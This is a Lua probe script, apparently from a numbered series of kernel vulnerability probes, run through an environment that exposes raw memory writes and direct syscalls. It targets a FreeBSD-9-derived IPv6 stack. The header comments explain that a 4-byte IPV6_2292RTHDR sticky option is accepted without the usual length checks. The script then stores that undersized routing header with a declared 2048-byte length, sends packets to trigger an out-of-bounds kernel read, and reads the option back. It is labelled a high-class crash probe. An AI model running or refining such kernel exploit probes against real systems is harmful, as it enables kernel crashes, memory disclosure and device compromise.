-- CRASH_CLASS: HIGH
-- PROBE 50n: sticky 2292 options - does the stored routing header get trusted
--
-- 50m found an asymmetry the source does not predict: as a cmsg, the 2292
-- extension-header types 22/23/24 all fail, but as a STICKY setsockopt with a
-- 4-byte buffer, type 24 (IPV6_2292RTHDR) returns 0 while 22 and 23 return -1.
-- Stock FreeBSD 9 requires a full routing header at that point (length and
-- ip6r_len consistency, plus PRIV_NETINET_SETHDROPTS).
--
-- If a 4-byte buffer was really stored as a routing header, the next send
-- builds the header from it and reads (ip6r_len + 1) << 3 bytes out of that
-- allocation. This probe sets the smallest possible buffer with the largest
-- declared length and then sends, with a receiver present, and finally reads
-- the option back through IPV6_2292PKTOPTIONS.

print("=== PROBE 50n: sticky 2292 routing header ===")

local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return to_num(v) end return -1 end
local function rbyte(a) local ok,v=pcall(function() return memory.read_byte(a) end) if ok then return to_num(v) end return -1 end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(f,...) local ok,rv=pcall(f,...) if not ok then return -999 end return to_num(rv) end
local function pid() return to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)) end

local SYS_socket, SYS_sendmsg, SYS_connect, SYS_bind, SYS_getsockname = 97, 28, 98, 104, 32
local SYS_setsockopt, SYS_getsockopt = 105, 118
local AF_INET6, SOCK_DGRAM, IPPROTO_UDP, IPPROTO_IPV6 = 28, 2, 17, 41

local srv = call(mk(SYS_socket), uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP))
local srv_sa = memory.alloc(0x40); zero(srv_sa, 0x40)
wb(srv_sa, 28); wb(srv_sa + 1, 28)
local br = call(mk(SYS_bind), uint64(srv), uint64(srv_sa), uint64(28))
local lenp = memory.alloc(8); zero(lenp, 8); wd(lenp, 28)
call(mk(SYS_getsockname), uint64(srv), uint64(srv_sa), uint64(lenp))
local port = rbyte(srv_sa + 2) * 256 + rbyte(srv_sa + 3)
print(string.format("[0] srv=%d bind=%d port=%d pid=%s", srv, br, port, tostring(pid())))

local fd = call(mk(SYS_socket), uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP))
local sa = memory.alloc(0x40); zero(sa, 0x40)
wb(sa, 28); wb(sa + 1, 28)
wb(sa + 2, math.floor(port / 256)); wb(sa + 3, port % 256)
wb(sa + 23, 1)
print("[1] connect=" .. call(mk(SYS_connect), uint64(fd), uint64(sa), uint64(28)))

local data = memory.alloc(0x40); zero(data, 0x40); wd(data, 0x41414141)
local iov = memory.alloc(0x20); zero(iov, 0x20)
wq(iov, data); wq(iov + 8, 4)
local mh = memory.alloc(0x80); zero(mh, 0x80)
wq(mh + 16, iov); wq(mh + 24, 1)
wq(mh + 32, 0); wq(mh + 40, 0)

local function send()
    return call(mk(SYS_sendmsg), uint64(fd), uint64(mh), uint64(0))
end
local function opt_set(t, buf, len)
    return call(mk(SYS_setsockopt), uint64(fd), uint64(IPPROTO_IPV6), uint64(t), uint64(buf), uint64(len))
end
local function opt_get(t, buf, len)
    local lp = memory.alloc(8); zero(lp, 8); wd(lp, len)
    local r = call(mk(SYS_getsockopt), uint64(fd), uint64(IPPROTO_IPV6), uint64(t), uint64(buf), uint64(lp))
    return r, rd(lp)
end
local function drain(tag)
    local rbuf = memory.alloc(0x200); zero(rbuf, 0x200)
    local n = call(mk(29), uint64(srv), uint64(rbuf), uint64(0x200), uint64(0x80))
    print(string.format("  %-40s recv=%s", tag, tostring(n)))
    return n
end

print("")
print("--- baseline ---")
print("  plain send ret=" .. send())
drain("baseline")

print("--- 4-byte routing header, ip6r_len=255, segleft=1 ---")
local rh = memory.alloc(0x40); zero(rh, 0x40)
wb(rh + 0, 0)     -- ip6r_nxt
wb(rh + 1, 255)   -- ip6r_len (declares 2048 bytes)
wb(rh + 2, 0)     -- ip6r_type = 0
wb(rh + 3, 1)     -- ip6r_segleft
print("  setsockopt(24,4) ret=" .. opt_set(24, rh, 4))
print("  send ret=" .. send())
drain("after bad sticky rthdr")

print("--- 8-byte routing header, ip6r_len=0, segleft=1 ---")
zero(rh, 0x40)
wb(rh + 1, 0); wb(rh + 3, 1)
print("  setsockopt(24,8) ret=" .. opt_set(24, rh, 8))
print("  send ret=" .. send())
drain("after 8-byte rthdr")

print("--- clear it (all-zero 8 bytes) ---")
zero(rh, 0x40)
print("  setsockopt(24,8 zero) ret=" .. opt_set(24, rh, 8))
print("  send ret=" .. send())
drain("after clear")

print("--- read back through IPV6_2292PKTOPTIONS (25) ---")
zero(rh, 0x40)
local r, got = opt_get(25, rh, 0x40)
print(string.format("  getsockopt(25) ret=%s len=%s first=%X %X %X %X",
    tostring(r), tostring(got), rbyte(rh), rbyte(rh + 1), rbyte(rh + 2), rbyte(rh + 3)))

print("--- 2292PKTINFO sticky with 4 bytes, then send ---")
local pi = memory.alloc(0x40); zero(pi, 0x40)
print("  setsockopt(19,4) ret=" .. opt_set(19, pi, 4))
print("  send ret=" .. send())
drain("after 4-byte pktinfo")

print("--- 2292PKTINFO sticky with 20 bytes, ifindex 1 ---")
zero(pi, 0x40); wd(pi + 16, 1)
print("  setsockopt(19,20) ret=" .. opt_set(19, pi, 20))
print("  send ret=" .. send())
drain("after 20-byte pktinfo")

print("[Z] alive=" .. tostring(pid()))
pcall(function() mk(6)(uint64(fd)) end)
pcall(function() mk(6)(uint64(srv)) end)
print("=== PROBE 50n COMPLETE ===")
